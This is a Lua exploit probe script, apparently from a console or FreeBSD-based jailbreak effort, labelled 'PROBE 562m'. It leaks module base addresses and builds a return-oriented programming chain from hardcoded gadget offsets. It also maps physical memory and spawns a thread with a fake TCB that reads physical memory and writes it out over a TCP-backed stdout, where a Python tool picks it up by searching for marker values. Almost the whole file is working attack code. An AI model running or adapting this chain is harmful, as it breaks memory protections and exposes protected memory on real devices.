-- CRASH_CLASS: MODERATE
-- PROBE 562m: Physical memory read via child stdout injection
--
-- STRATEGY:
-- Child thread reads 4 qwords from MapDM'd phys → shared buffer.
-- Then writes shared buffer to fd 1 (stdout = TCP socket) via fn_addr.
-- Data arrives at Python tool mixed with "77" binary trace.
-- Python extractor finds markers 0xAABBCCDD/0x11223344 in raw stream.
--
-- The "77" trace blocks are 280-byte structures that DON'T contain
-- register values (only control flow). Our injected write(1) produces
-- RAW data bytes that we can identify by unique markers.

print("=== PROBE 562m: PHYS READ (stdout inject) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

io.flush()

-- ============================================================
-- [A] MapDM phys 0x100000000
-- ============================================================
print("[A] MapDM phys 0x100000000")
local sc477 = mk(477)
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("MapDM rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [B] Shared buffer layout:
-- +0x00: 0xAABBCCDD11223344 (start marker)
-- +0x08: 0x55667788AABBCCDD (second marker)
-- +0x10: qword[0] from phys
-- +0x18: qword[1] from phys
-- +0x20: qword[2] from phys
-- +0x28: qword[3] from phys
-- +0x30: 0xDEADFACE00C0FFEE (end marker)
-- +0x38: 0xFEEDBABE12345678 (end marker 2)
-- Total: 64 bytes (0x40)
-- ============================================================
local shared = memory.alloc(0x80)
for i = 0, 0x7C, 4 do wd(N(shared) + i, 0) end
local sh = N(shared)

-- Pre-fill markers (child will overwrite qwords 2-5 with phys data)
wq(sh + 0x00, uint64("0xAABBCCDD11223344"))
wq(sh + 0x08, uint64("0x55667788AABBCCDD"))
wq(sh + 0x30, uint64("0xDEADFACE00C0FFEE"))
wq(sh + 0x38, uint64("0xFEEDBABE12345678"))

local data_len = 0x40  -- 64 bytes total

-- MMAP stack
local ss = 0x4000
local ok_stk, sb_raw = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb = N(sb_raw)
local rsp = sb + ss - ((sb + ss) % 16) - 8

-- ============================================================
-- [C] Build chain
-- ============================================================
print("[C] building chain")
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- Phase 1: fake TCB (sysarch SET_FSBASE=129)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
local ftcb = N(fake_tcb)
-- Self-referencing pointer
wq(ftcb, uint64(ftcb))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(ftcb))

emit(g_pop_rdi); emit(uint64(129))       -- SET_FSBASE
emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
emit(g_pop_rax); emit(uint64(165))       -- sysarch
emit(stub)

-- Phase 2: read 4 qwords from mapped_va → shared+0x10..+0x28
for qi = 0, 3 do
    emit(g_pop_rsi); emit(mapped_va + uint64(qi * 8))
    emit(g_mov_rax_m)
    emit(g_pop_rdi); emit(uint64(sh + 0x10 + qi * 8))
    emit(g_mov_m_rax)
end

-- Phase 3: write DEADFACE sentinel at shared+0x30 (overwrite pre-filled)
-- Actually the end marker is already pre-filled, so skip this.
-- But to confirm child completed all reads, overwrite +0x30 with a NEW value:
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh + 0x30))
emit(g_mov_m_rax)

-- Phase 4: write(1, shared, 64) via fn_addr — inject into stdout
emit(g_pop_rdi); emit(uint64(1))         -- fd = 1 (stdout)
emit(g_pop_rsi); emit(uint64(sh))        -- buf = shared
emit(g_pop_rdx); emit(uint64(data_len))  -- len = 64
emit(g_pop_rax); emit(uint64(4))         -- SYS_write = 4
emit(stub)

-- Phase 5: thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain: %d entries (%d bytes)", off/8, off))

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

io.flush()

-- ============================================================
-- [D] Spawn
-- ============================================================
print("[D] spawning child...")
print("MARKERS: start=AABBCCDD11223344 end=DEADFACECAFEBABE")
print("Python: search raw output for these 8-byte LE sequences")
io.flush()

pcall(function() mk(455)(pa, uint64(0x38)) end)

-- Wait
for w = 1, 50000 do
    for j = 1, 10 do local x = j * j end
end

-- Main thread probably dead by now but try anyway
io.flush()
print("")
print("=== 562m DONE ===")
